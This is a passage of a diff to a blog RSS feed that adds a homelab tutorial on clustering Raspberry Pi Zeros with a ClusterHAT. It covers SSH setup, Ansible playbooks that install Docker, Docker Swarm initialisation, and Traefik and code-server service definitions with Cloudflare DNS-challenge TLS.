@@ -5,8 +5,865 @@
         <description>Recent content in Posts on [audible]blink</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Mon, 04 May 2020 15:58:04 -0400</lastBuildDate>
+        <lastBuildDate>Fri, 08 Oct 2021 11:25:41 -0400</lastBuildDate>
         <atom:link href="https://sec.alexflor.es/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Clustering Pi Zeros With ClusterHAT, Docker Swarm, Traefik, and Ansible</title>
+            <link>https://sec.alexflor.es/posts/2021/10/clustering-pi-zeros-with-clusterhat-docker-swarm-traefik-and-ansible/</link>
+            <pubDate>Fri, 08 Oct 2021 11:25:41 -0400</pubDate>
+            
+            <guid>https://sec.alexflor.es/posts/2021/10/clustering-pi-zeros-with-clusterhat-docker-swarm-traefik-and-ansible/</guid>
+            <description>It calls to you. Your drawer of misfit toys and abandoned projects.
+Every few months, I come back to the world of SoCs to see what&amp;rsquo;s new, but nothing ever really sticks around long enough for it to be considered useful enough to be permanent.
+ Smart mirrors Twitter bots that shame you for not watering your plants Video Game emulators Home control devices The occasional GPIO project to manipulate things in MeatSpace  The only exception is probably an ad-blocking DNS server, the Pi-Hole.</description>
+            <content type="html"><![CDATA[<p><img src="0.png" alt=""></p>
+<hr>
+<p><strong>It calls to you.</strong> Your drawer of misfit toys and abandoned projects.</p>
+<p>Every few months, I come back to the world of SoCs to see what&rsquo;s new, but nothing
+ever really sticks around long enough for it to be considered useful enough to be permanent.</p>
+<ul>
+<li>Smart mirrors</li>
+<li><a href="https://twitter.com/thirstyplant1">Twitter bots that shame you</a> for not watering
+your plants</li>
+<li>Video Game emulators</li>
+<li>Home control devices</li>
+<li>The occasional GPIO project to manipulate things in MeatSpace</li>
+</ul>
+<p>The only exception is probably an ad-blocking DNS server, the Pi-Hole. But even that&rsquo;s been
+graduated to running as distributed Linux Containers (<a href="https://linuxcontainers.org">LXC</a>)</p>
+<p>All that said, this project is also probably drawer-bound, but at least it was fun!</p>
+<h2 id="the-clusterhat">The ClusterHAT</h2>
+<p><img src="1.jpg" alt=""></p>
+<blockquote>
+<p><a href="https://www.sparkfun.com/products/18155">https://www.sparkfun.com/products/18155</a></p>
+</blockquote>
+<p>The ClusterHAT sits atop a traditional Raspberry Pi, aka a HAT (Hardware Attached on Top. Yes,
+really). It has slots for you to insert 4 Raspberry Pi Zeros. When Gadget Mode is enabled, and
+the Zeros attach to the HAT, they become their own little subnet, branching off the main Pi.</p>
+<blockquote>
+<p>Gadget Mode enables networking over USB</p>
+</blockquote>
+<p>If comparing to a traditional network setup, we might think of the HAT like a network switch.
+When you combine the HAT with the modified Raspbian ISOs provided by <a href="https://www.8086.net">8086</a>,
+in a couple of minutes you have a little cluster of Pis, ready to do your bidding.</p>
+<h3 id="setup">Setup</h3>
+<p>The instruction over at <a href="https://clusterhat.com/setup-overview">https://clusterhat.com/setup-overview</a> are pretty clear, but in summary:</p>
+<ul>
+<li>The main Pi has its own ISO, which comes in two flavors:
+<ul>
+<li>CNAT - Pi Zeros are served IPs from the main Pi in the 172.19.181/24 range</li>
+<li>CBRIDGE - All 5 Pis are on the same network as you</li>
+</ul>
+</li>
+<li>Pi Zeros get there own corresponding, numbered ISO
+<ul>
+<li>Pi #1 gets ISO P1, and is assigned 172.18.181.1
+<ul>
+<li><em>if using the CNAT image</em></li>
+</ul>
+</li>
+<li>Pi #2 gets ISO P2, and is assigned 172.18.181.2</li>
+<li>and so on</li>
+</ul>
+</li>
+</ul>
+<p><a href="https://8086.support/index.php?action=faq&amp;cat=23&amp;id=97&amp;artlang=en">You <em>can</em> netboot</a>
+all of the Zeros from the main Pi&rsquo;s, but keep in mind you&rsquo;d be sharing a single sdcard between 5
+operating systems. It&rsquo;s cool to see, if you have the time, but it might not be an ideal long term
+solution. <code>apt upgrade</code> on 5 nodes took about an hour. YMMV since sdcards come in a variety of
+speeds.</p>
+<p><a href="https://8086.support/content/23/97/en/how-do-i-boot-pi-zeros-without-sd-cards-cluster-hat_cluster-ctrl.html">Netboot instructions here</a></p>
+<p>Once all the sdcards are flashed, (or netboot shares copied), make sure to <code>touch /boot/ssh</code> on
+each node to enable remote access.</p>
+<h3 id="connecting-to-the-pis">Connecting to the Pis</h3>
+<p>Place your Zeros in the ClusterHat&rsquo;s ports and attach the ClusterHat to the main Pi.</p>
+<p>Boot up the main Pi, SSH in, and supply power to the Zeros with:</p>
+<pre tabindex="0"><code>clusterctrl up p{1,2,3,4}
+</code></pre><p>Let&rsquo;s talk about the CNAT image. The Zeros aren&rsquo;t directly accessible from your main LAN. Instead
+of SSHing to the main Pi, then SSHing again to each Zero, we can simplify the process by
+setting the main Pi, which <em>is</em> on your direct physical network, as an SSH ProxyJump.</p>
+<p>In your ~/.ssh/config file, put in the following, with modifications for your hostnames and IPs, of
+course:</p>
+<pre tabindex="0"><code class="language-config" data-lang="config">Host *.chappa.ai
+  ProxyJump hammond
+  User Pi
+
+Host hammond.chappa.ai
+    HostName 192.168.42.10
+
+Host oneil.chappa.ai
+    HostName 172.19.181.1
+
+Host carter.chappa.ai
+    HostName 172.19.181.2
+
+Host tealc.chappa.ai
+    HostName 172.19.181.3
+
+Host danieljackson.chappa.ai
+    HostName 172.19.181.4
+</code></pre><p>You can then copy your ssh public key to each host with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">for</span> name in <span style="color:#f92672">{</span>hammond,oneil,carter,tealc,danieljackson<span style="color:#f92672">}</span>.chappa.ai ; <span style="color:#66d9ef">do</span>
+  ssh-copy-id -i ~/.ssh/id_ed25519 <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#66d9ef">done</span>
+</code></pre></div><p>Enter your passwords and you should now be set up for password-less ssh, which we&rsquo;ll need later to
+continue installing Docker on each node with Ansible.</p>
+<p>On each Pi, run through the menu at <code>sudo raspi-config</code>. Spend as much or as little time as you
+want here. I usually just go with:</p>
+<p><img src="2.png" alt=""></p>
+<ol>
+<li>System Options</li>
+</ol>
+<ul>
+<li>change password</li>
+<li>change hostname</li>
+</ul>
+<ol start="4">
+<li>Performance Options</li>
+</ol>
+<ul>
+<li>reduce gpu memory to 16</li>
+</ul>
+<ol start="6">
+<li>Advance Options</li>
+</ol>
+<ul>
+<li>expand memory card</li>
+</ul>
+<h2 id="docker-prep-with-ansible">Docker Prep With Ansible</h2>
+<p>Raspberry Pis need to have some options enabled before containers are able to run.</p>
+<p>Later, we&rsquo;ll append to their <code>/boot/cmdline.txt</code> the following:</p>
+<pre tabindex="0"><code>cgroup_memory=1 cgroup_enable=memory cgroup_enable=cpuset
+</code></pre><p>This tells the kernel to allow the use of <code>cgroups</code>, or &ldquo;control groups&rdquo;. Docker containers are just
+a scoped set of process and resources on your computer. Containers were around long before Docker,
+which made the use of Linux Namespaces and CGroups more accessible.</p>
+<h3 id="a-small-tangent-on-containers">A Small Tangent on Containers</h3>
+<blockquote>
+<p>Containers are logical units of Linux kernel features, distributed as tarballs, whose processes
+are anchored to namespaces and controlled by CGroups.</p>
+</blockquote>
+<h4 id="why-are-namespaces">Why are Namespaces</h4>
+<p>To create a Namespace for a process, additional flags must be passed to process-creation syscalls.
+These additional flags can restrict what this process can see and what other processes can see
+about it</p>
+<p><strong>Other things you can namespace</strong></p>
+<ul>
+<li>Hostnames</li>
+<li>Process IDs</li>
+<li>Filesystems</li>
+<li>IPC</li>
+<li>Networking</li>
+<li>User IDs</li>
+</ul>
+<h4 id="why-are-cgroups">Why are CGroups</h4>
+<p>At its most basic? They allow you to control, audit, and limit how your system&rsquo;s resources are
+accessed or used.</p>
+<ul>
+<li><strong>Resource limiting</strong> Groups can be set to not exceed a configured memory limit</li>
+<li><strong>Prioritization</strong> Some groups may get a larger share of CPU or disk I/O</li>
+<li><strong>Accounting</strong> Measures a group&rsquo;s resource usage</li>
+<li><strong>Control</strong> Freezing groups of processes</li>
+</ul>
+<p>What sorts of things can we control?</p>
+<ul>
+<li>Memory: <code>/sys/fs/cgroup/memory</code></li>
+<li>CPU/Cores <code>/sys/fs/cgroup/cpu*</code></li>
+<li>I/O <code>/sys/fs/cgroup/blkio</code></li>
+<li>Processes <code>/sys/fs/cgroup/cgroup.procs</code></li>
+<li>Devices <code>/sys/fs/cgroup/devices.*</code></li>
+</ul>
+<h3 id="automating-setup">Automating Setup</h3>
+<p>If we&rsquo;re interested in following along, all the playbooks can be found here:
+<a href="https://github.com/audibleblink/clusterctrl-ansible/">https://github.com/audibleblink/clusterctrl-ansible/</a></p>
+<p>First, we&rsquo;ll need to setup our inventory file and name our groups. Below is one possible
+configuration.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#75715e"># file: inventory.ini</span>
+<span style="color:#66d9ef">[clusterctrl_server]</span>
+<span style="color:#a6e22e">hammond</span>
+
+
+<span style="color:#66d9ef">[clusterctrl_nodes]</span>
+<span style="color:#a6e22e">oneil</span>
+<span style="color:#a6e22e">carter</span>
+<span style="color:#a6e22e">tealc</span>
+<span style="color:#a6e22e">danieljackson</span>
+
+
+<span style="color:#66d9ef">[clusterctrl:children]</span>
+<span style="color:#a6e22e">clusterctrl_server</span>
+<span style="color:#a6e22e">clusterctrl_nodes</span>
+
+</code></pre></div><p>If you&rsquo;d like, create an <code>ansible.cfg</code> to save a couple keystrokes when calling <code>ansible-playbook</code>.
+Otherwise you&rsquo;d need to specify an inventory file each time.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#66d9ef">[defaults]</span>
+<span style="color:#a6e22e">inventory</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">./inventory.ini</span>
+<span style="color:#a6e22e">interpreter_python</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/usr/bin/python3</span>
+</code></pre></div><p>The following task ensures, in an idempotent way, that our kernel flags exist on all our Pis, and
+reboots the Pi if the flags weren&rsquo;t already there.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml">---
+
+- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Enable container features</span>
+  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
+  <span style="color:#f92672">register</span>: <span style="color:#ae81ff">containers_enabled</span>
+  <span style="color:#f92672">replace</span>:
+    <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/boot/cmdline.txt</span>
+    <span style="color:#f92672">regexp</span>: <span style="color:#e6db74">&#39;^([\w](?!.*\b{{ item }}\b).*)$&#39;</span>
+    <span style="color:#f92672">replace</span>: <span style="color:#e6db74">&#39;\1 {{ item }}&#39;</span>
+  <span style="color:#f92672">with_items</span>:
+  - <span style="color:#e6db74">&#34;cgroup_enable=cpuset&#34;</span>
+  - <span style="color:#e6db74">&#34;cgroup_memory=1&#34;</span>
+  - <span style="color:#e6db74">&#34;cgroup_enable=memory&#34;</span>
+
+
+- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Reboot after enabling containers</span>
+  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
+  <span style="color:#f92672">when</span>: <span style="color:#ae81ff">containers_enabled.changed</span>
+  <span style="color:#f92672">reboot</span>:
+</code></pre></div><p>Here we ensure all necessary packages, GPG keys, and repos are present before installing
+<code>docker-ce</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml">---
+
+- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Install Docker Prereqs</span>
+  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
+  <span style="color:#f92672">apt</span>:
+    <span style="color:#f92672">package</span>: <span style="color:#e6db74">&#34;{{ packages }}&#34;</span>
+    <span style="color:#f92672">state</span>: <span style="color:#ae81ff">present</span>
+
+- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Add Docker GPG apt Key</span>
+  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
+  <span style="color:#f92672">apt_key</span>:
+    <span style="color:#f92672">url</span>: <span style="color:#e6db74">&#34;{{ gpg_key_url }}&#34;</span>
+    <span style="color:#f92672">state</span>: <span style="color:#ae81ff">present</span>
+    <span style="color:#f92672">keyring</span>: <span style="color:#e6db74">&#34;{{ gpg_key_out }}&#34;</span>
+
+- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Add Docker Repository</span>
+  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
+  <span style="color:#f92672">apt_repository</span>:
+    <span style="color:#f92672">repo</span>: <span style="color:#e6db74">&#34;deb [arch={{arch}} signed-by={{ gpg_key_out }}] {{ repo_url }}  {{ release }} stable&#34;</span>
+    <span style="color:#f92672">state</span>: <span style="color:#ae81ff">present</span>
+
+- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Update apt and install docker-ce</span>
+  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
+  <span style="color:#f92672">apt</span>:
+    <span style="color:#f92672">package</span>: <span style="color:#e6db74">&#34;{{ docker_packages }}&#34;</span>
+    <span style="color:#f92672">state</span>: <span style="color:#ae81ff">latest</span>
+    <span style="color:#f92672">update_cache</span>: <span style="color:#66d9ef">yes</span>
+</code></pre></div><p>An example of a variable file that needs to exist for the code above to work looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml">
+<span style="color:#75715e"># docker installation prerequisites</span>
+<span style="color:#f92672">packages</span>:
+  - <span style="color:#ae81ff">apt-transport-https</span>
+  - <span style="color:#ae81ff">ca-certificates</span>
+  - <span style="color:#ae81ff">curl</span>
+  - <span style="color:#ae81ff">gnupg</span>
+  - <span style="color:#ae81ff">lsb-release</span>
+
+<span style="color:#75715e"># docker repo gpg key location</span>
+<span style="color:#f92672">gpg_key_url</span>: <span style="color:#ae81ff">https://download.docker.com/linux/raspbian/gpg</span>
+
+<span style="color:#75715e"># outfile on local disk for docker repo gpg key</span>
+<span style="color:#f92672">gpg_key_out</span>: <span style="color:#ae81ff">/usr/share/keyrings/docker-archive-keyring.gpg</span>
+
+<span style="color:#75715e"># components for genreating the `deb` line being added to `/etc/apt/sources.list.d`</span>
+<span style="color:#f92672">repo_url</span>: <span style="color:#ae81ff">https://download.docker.com/linux/raspbian</span>
+<span style="color:#f92672">release</span>: <span style="color:#ae81ff">buster</span>
+<span style="color:#f92672">arch</span>: <span style="color:#ae81ff">armhf</span>
+
+<span style="color:#75715e"># installing docker</span>
+<span style="color:#f92672">docker_packages</span>:
+  - <span style="color:#ae81ff">docker-ce </span>
+  - <span style="color:#ae81ff">docker-ce-cli </span>
+  - <span style="color:#ae81ff">containerd.io</span>
+</code></pre></div><h4 id="folder-structure">Folder Structure</h4>
+<p>All of the tasks can live in a single playbook, we don&rsquo;t need to over complicate things and use
+the folder hierarchy that Ansible Docs recommend for managing big fleets.</p>
+<p>&hellip;</p>
+<p>But we&rsquo;re gonna anyways.</p>
+<pre tabindex="0"><code>├── ansible.cfg
+├── clusterctrl.yml
+├── inventory.list
+├── roles
+│   ├── clusterctrl
+│   │   ├── tasks
+│   │   │   ├── main.yml
+│   │   │   ├── apt_upgrade.yml
+│   │   │   ├── ensure_aptitude.yml
+│   │   │   ├── enable_containers.yml
+│   │   │   ├── install_docker.yml
+│   │   │   ├── docker_group_add.yml
+│   │   │   └── swarm_init.yml
+│   │   ├── vars
+│   │   │   └── main.yml
+
+</code></pre><p>Both simple and hierarchical methods are available here.  <a href="https://github.com/audibleblink/clusterctrl-ansible/">https://github.com/audibleblink/clusterctrl-ansible/</a></p>
+<blockquote>
+<p><em>Why even talk about the folder structure then?</em><br>
+Porque no los dos?</p>
+</blockquote>
+<p>Some may already have an Ansible repo and most likely have playbooks to manage updates, upgrades,
+and user management so it might not make sense to keep those tasks in a single-file play.
+Sharing it in this form makes it a bit easier to incorporate to existing Ansible setups. Also, if
+someone&rsquo;s just starting their Ansible repo, perhaps this could serve as a starting skeleton</p>
+<hr>
+<p><strong>Back to the Pis</strong></p>
+<p>Once all Pis are up and playbooks intact, run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ansible-playbook clusterctrl.yml
+</code></pre></div><h2 id="docker-swarm-init">Docker Swarm Init</h2>
+<p>It is possible to both initialize and populate the Swarm with an Ansible play, but it requires some
+more setup and the use of plugins. We&rsquo;ll meet in the middle though, and still use Ansible to run the commands
+remotely instead of ssh-ing to each. (although that is what&rsquo;s happening in Ansible&rsquo;s background
+anyway)</p>
+<p>Because of our <code>inventory.list</code> config file in the current directory, on the main Pi, we can run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ansible clusterctrl_server -a <span style="color:#e6db74">&#34;docker swarm init --advertise-addr 172.19.181.254&#34;</span>
+
+<span style="color:#75715e"># If we didn&#39;t have that config file, we&#39;d need to tell `ansibile` where to find our inventory file.</span>
+ansible -i /path/to/inventory clusterctrl_server -a <span style="color:#e6db74">&#34;docker swarm init --advertise-addr 172.19.181.254&#34;</span>
+
+</code></pre></div><p>The <code>172</code> IP is for the internal network interface that the Pi Zeros attach to.</p>
+<p>We should get an output that includes a line that looks like this:</p>
+<pre tabindex="0"><code>docker swarm join \
+  --token SWMTKM-1-1y1rdnp7zjcj2vfw7mkhwzrwizqzixzffmoz4wew1brs0vlnh7-4axlaf1luquyxdgdq6gp3jalr \
+  172.19.181.254:2377
+</code></pre><p>Let&rsquo;s run that command on each node like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ansible clusterctrl_nodes -a <span style="color:#e6db74">&#34;docker swarm join --token SWMTKM-1-1y1rdnp7zjcj2vfw7mkhwzrwizqzixzffmoz4wew1brs0vlnh7-4axlaf1luquyxdgdq6gp3jalr 172.19.181.254:2377&#34;</span>
+</code></pre></div><p>Hopefully our output looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ ansible clusterctrl_nodes -a <span style="color:#e6db74">&#34;docker swarm join --token SWMTKN-1-5lyx690gdzra3jw0ijeuug2sifezuohhb51sk6qw00n8dulebq-23l27nw3oxjh2591shgyncp39 172.19.181.254:2377&#34;</span>
+
+carter | CHANGED | rc<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> &gt;&gt;
+This node joined a swarm as a worker.
+danieljackson | CHANGED | rc<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> &gt;&gt;
+This node joined a swarm as a worker.
+oneil | CHANGED | rc<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> &gt;&gt;
+This node joined a swarm as a worker.
+tealc | CHANGED | rc<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> &gt;&gt;
+This node joined a swarm as a worker.
+</code></pre></div><p>View your new Swarm Cluster with:</p>
+<pre tabindex="0"><code>pi@hammond:~ $ docker node ls
+ID                            HOSTNAME        STATUS    AVAILABILITY   MANAGER STATUS   ENGINE VERSION
+o4i5q6yu4r3cc01t3nhcvv6nv *   hammond         Ready     Active         Leader           20.10.9
+8f4k7jlwlfx60x0aadmjbn350     oneil           Ready     Active                          20.10.9
+lpqd72inz9vooxgidyc14o7l6     carter          Ready     Active                          20.10.9
+bhbwbtcyaw56oxzvb3hnawr5y     tealc           Ready     Active                          20.10.9
+hxplragfdecau0x464s8jf5s9     danieljackson   Ready     Active                          20.10.9
+</code></pre><h2 id="deploying-our-first-workload">Deploying Our First Workload</h2>
+<p>With our cluster ready to receive commands, let&rsquo;s deploy <a href="https://hub.docker.com/r/linuxserver/code-server">code-server</a>
+behind the dynamic reverse proxy, Traefik. We&rsquo;ll configure Traefik to also assign valid TLS certs
+for our internal network, without having to expose anything to the broader internet by using the
+cloudflare DNS challenge functionality build into Traefik.</p>
+<p>If you already own a domain name, create/use a cloudflare account and switch the DNS server in
+your registrar settings to cloudflare&rsquo;s servers. Then create API tokens for just that DNS zone.
+We&rsquo;ll plug it into Traefik so it knows to how to answer DNS challenges from Let&rsquo;s Encrypt.</p>
+<p>The service definition for Swarm looks like this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">---
+<span style="color:#f92672">version</span>: <span style="color:#e6db74">&#34;3.8&#34;</span>
+
+<span style="color:#f92672">networks</span>:
+  <span style="color:#f92672">proxy</span>:
+    <span style="color:#f92672">external</span>: <span style="color:#66d9ef">true</span>
+
+<span style="color:#f92672">secrets</span>:
+  <span style="color:#f92672">cf_token</span>:
+    <span style="color:#f92672">external</span>: <span style="color:#66d9ef">true</span>
+
+<span style="color:#f92672">services</span>:
+
+  <span style="color:#f92672">traefik</span>:
+    <span style="color:#f92672">image</span>: <span style="color:#e6db74">&#34;traefik:latest&#34;</span>
+    <span style="color:#f92672">secrets</span>:
+      - <span style="color:#ae81ff">cf_token</span>
+    <span style="color:#f92672">environment</span>:
+      - <span style="color:#ae81ff">CF_API_EMAIL=sg1@sgc.gov</span>
+      - <span style="color:#ae81ff">CF_DNS_API_TOKEN_FILE=/run/secrets/cf_token</span>
+
+    <span style="color:#f92672">command</span>: &gt;<span style="color:#e6db74">
+</span><span style="color:#e6db74">      --api.dashboard=true
+</span><span style="color:#e6db74">      --api.insecure=true
+</span><span style="color:#e6db74">      --providers.docker.swarmmode=true
+</span><span style="color:#e6db74">      --providers.docker.exposedbydefault=false
+</span><span style="color:#e6db74">      --providers.docker.network=proxy
+</span><span style="color:#e6db74">      --providers.file.filename=/traefik_provider.yml
+</span><span style="color:#e6db74">      --providers.file.watch=true
+</span><span style="color:#e6db74">      --entrypoints.web.address=&#34;:80&#34;
+</span><span style="color:#e6db74">      --entrypoints.web.http.redirections.entrypoint.to=websecure
+</span><span style="color:#e6db74">      --entrypoints.websecure.address=&#34;:443&#34;
+</span><span style="color:#e6db74">      --entrypoints.websecure.http.tls.certresolver=cloudflare
+</span><span style="color:#e6db74">      --entrypoints.websecure.http.tls.domains[0].main=chappa.ai
+</span><span style="color:#e6db74">      --entrypoints.websecure.http.tls.domains[0].sans=*.chappa.ai
+</span><span style="color:#e6db74">      --serverstransport.insecureskipverify=true
+</span><span style="color:#e6db74">      --certificatesresolvers.cloudflare.acme.email=sg1@sgc.gov
+</span><span style="color:#e6db74">      --certificatesresolvers.cloudflare.acme.dnschallenge.provider=cloudflare
+</span><span style="color:#e6db74">      --certificatesresolvers.cloudflare.acme.dnschallenge.resolvers=1.1.1.1:53
+</span><span style="color:#e6db74">      --certificatesresolvers.cloudflare.acme.storage=/config/acme.json</span>      
+
+    <span style="color:#f92672">networks</span>:
+      - <span style="color:#ae81ff">proxy</span>
+
+    <span style="color:#f92672">ports</span>:
+      - <span style="color:#ae81ff">80</span>:<span style="color:#ae81ff">80</span>
+      - <span style="color:#ae81ff">443</span>:<span style="color:#ae81ff">443</span>
+
+    <span style="color:#f92672">volumes</span>:
+      - <span style="color:#e6db74">&#34;/var/run/docker.sock:/var/run/docker.sock:ro&#34;</span>
+      - <span style="color:#e6db74">&#34;appdata:/config&#34;</span>
+
+    <span style="color:#f92672">deploy</span>:
+
+      <span style="color:#f92672">placement</span>:
+        <span style="color:#f92672">constraints</span>:
+          - <span style="color:#e6db74">&#34;node.role == manager&#34;</span>
+
+      <span style="color:#f92672">labels</span>:
+        - <span style="color:#e6db74">&#34;traefik.enable=true&#34;</span>
+        - <span style="color:#e6db74">&#34;traefik.docker.network=proxy&#34;</span>
+
+        - <span style="color:#e6db74">&#34;traefik.http.routers.api.entrypoints=websecure&#34;</span>
+        - <span style="color:#e6db74">&#34;traefik.http.routers.api.tls=true&#34;</span>
+        - <span style="color:#e6db74">&#34;traefik.http.routers.api.rule=Host(`traefik.chappa.ai`)&#34;</span>
+        - <span style="color:#e6db74">&#34;traefik.http.routers.api.service=api@internal&#34;</span>
+        - <span style="color:#e6db74">&#34;traefik.http.services.api.loadbalancer.server.port=8080&#34;</span>
+
+<span style="color:#f92672">volumes</span>:
+  <span style="color:#f92672">appdata</span>:
+    <span style="color:#f92672">driver_opts</span>:
+      <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;cifs&#34;</span>
+      <span style="color:#f92672">o</span>: <span style="color:#e6db74">&#34;username=docker,password=swarm,vers=3.0,uid=1000,gid=1000,rw,umask=0177&#34;</span>
+      <span style="color:#f92672">device</span>: <span style="color:#e6db74">&#34;//YOUR_NAS_IP/configs/swarm/traefik&#34;</span>
+</code></pre></div><p>A couple notes:</p>
+<ul>
+<li>This config uses Swarm&rsquo;s Secrets functionality. You create them with <code>docker secret create</code>, then
+reference them in your service definition.
+<ul>
+<li>You can also set the <code>CF_DNS_API_TOKEN</code> environment variable manually. The <code>_FILE</code> suffix on
+the enivronment variable above is a Swarm-ism so you can use files as string inputs</li>
+</ul>
+</li>
+<li>It uses a Volume, which is an SMB share elsewhere on the network, in order to store persistent
+data. This is where we&rsquo;ll save the <code>acme.json</code> file that Traefik gets from cloudflare.</li>
+<li>It also enables the Traefik dashboard and API. Useful for getting an overview of everything
+deployed through Traefik, but should be disabled if public facing or when not troubleshooting.</li>
+<li>Traefik can use many different certificate resolvers, cloudflare is just one of many.</li>
+<li>Since Traefik is the ingress for the whole cluster, it is scoped to only be deployed on the
+manager node (hammond, in this case)</li>
+<li>Whenever you see <code>external: true</code> in Swarm docker-compose files, that means the resource already exists in the
+swarm. You&rsquo;ll see that <code>secrets</code> and <code>network</code> both have this key/value. Before deploying this
+service, <code>docker network create -d overlay proxy</code></li>
+<li>Notice the <code>umask</code> in the volumes block. The eventual <code>acme.json</code> needs to have <code>0600</code>
+permissions in order for Traefik to read it in the future. It will complain about the
+permissions being overly-permissive and won&rsquo;t use the certs when you browse to your services.</li>
+</ul>
+<p>When ready, from your server node run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">docker stack deploy -c docker-compose.yml
+</code></pre></div><p>This should spin up your Traefik container. Once you attempt to access it at
+<code>https://traefik.chappa.ai</code> for the first time, Traefik will conduct the challenge/response dance
+necessary to grant you certificates to <code>chappa.ai</code> and a wildcard cert at <code>*.chappa.ai</code> (previously
+configured in the service definition above)</p>
+<p><img src="3.png" alt=""></p>
+<p>Finally, lets deploy code-server, which is VSCode in a browser. Handy for editing things from any
+computer, or remote dev on Linux.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">---
+<span style="color:#f92672">version</span>: <span style="color:#e6db74">&#34;3&#34;</span>
+
+<span style="color:#f92672">networks</span>:
+  <span style="color:#f92672">proxy</span>:
+    <span style="color:#f92672">external</span>: <span style="color:#66d9ef">true</span>
+
+<span style="color:#f92672">services</span>:
+
+  <span style="color:#f92672">code</span>:
+    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">linuxserver/code-server:arm32v7-latest</span>
+    <span style="color:#f92672">environment</span>:
+      - <span style="color:#ae81ff">PUID=1000</span>
+      - <span style="color:#ae81ff">PGID=1000</span>
+      - <span style="color:#ae81ff">TZ=America/New_York</span>
+      - <span style="color:#ae81ff">PROXY_DOMAIN=code.chappa.ai</span>
+      - <span style="color:#ae81ff">PASSWORD=password</span> <span style="color:#75715e">#optional</span>
+      - <span style="color:#ae81ff">SUDO_PASSWORD=password</span> <span style="color:#75715e">#optional</span>
+      <span style="color:#75715e"># - HASHED_PASSWORD= #optional</span>
+      <span style="color:#75715e"># - SUDO_PASSWORD_HASH= #optional</span>
+
+    <span style="color:#f92672">networks</span>:
+      - <span style="color:#ae81ff">proxy</span>
+
+    <span style="color:#f92672">volumes</span>:
+      - <span style="color:#e6db74">&#34;appdata:/config&#34;</span>
+
+    <span style="color:#f92672">ports</span>:
+      - <span style="color:#e6db74">&#34;8443:8443&#34;</span>
+
+    <span style="color:#f92672">deploy</span>:
+
+      <span style="color:#f92672">placement</span>:
+        <span style="color:#f92672">constraints</span>:
+          - <span style="color:#e6db74">&#34;node.role == manager&#34;</span>
+      <span style="color:#f92672">labels</span>:
+        - <span style="color:#e6db74">&#34;traefik.enable=true&#34;</span>
+        - <span style="color:#e6db74">&#34;traefik.docker.network=proxy&#34;</span>
+
+        - <span style="color:#e6db74">&#34;traefik.http.routers.code-rtr.entrypoints=websecure&#34;</span>
+        - <span style="color:#e6db74">&#34;traefik.http.routers.code-rtr.tls=true&#34;</span>
+        - <span style="color:#e6db74">&#34;traefik.http.routers.code-rtr.rule=Host(`code.chappa.ai`)&#34;</span>
+        - <span style="color:#e6db74">&#34;traefik.http.routers.code-rtr.service=code-svc&#34;</span>
